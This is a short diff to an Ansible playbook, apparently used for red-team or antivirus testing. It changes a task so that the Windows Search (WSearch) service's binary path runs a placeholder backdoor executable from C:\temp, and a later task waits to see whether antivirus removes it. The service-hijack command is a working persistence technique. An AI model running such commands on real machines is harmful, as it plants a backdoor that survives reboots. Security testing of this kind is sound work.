@@ -6,7 +6,7 @@
   tasks:
   - name: Modify service path for WSearch service
     win_command: |
-      sc config test2 binpath= "cmd /c C:\temp\{{ backdoor_exe }}"  
+      sc config WSearch binpath= "cmd /c C:\temp\{{ backdoor_exe }}"  
   
   - name: sleep for 10 seconds and continue with play to check if AV removed or Not
     tags: always
